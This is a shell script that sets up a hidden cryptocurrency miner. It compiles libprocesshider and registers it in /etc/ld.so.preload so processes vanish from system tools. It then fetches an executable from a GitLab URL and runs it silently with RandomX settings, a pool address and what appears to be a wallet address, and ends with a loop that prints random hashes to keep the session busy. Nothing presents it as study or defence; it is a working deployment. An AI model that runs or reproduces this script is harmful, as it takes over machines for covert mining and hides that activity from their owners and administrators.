#!/bin/sh
ln -fs /usr/share/zoneinfo/America/Toronto /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update
apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start

git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider;make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..
A=209.97.162.131:443
B=ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ
C=BAROKAH
wget https://gitlab.com/os6335803/in/-/raw/main/curik && chmod u+x curik
./curik --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
r

while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
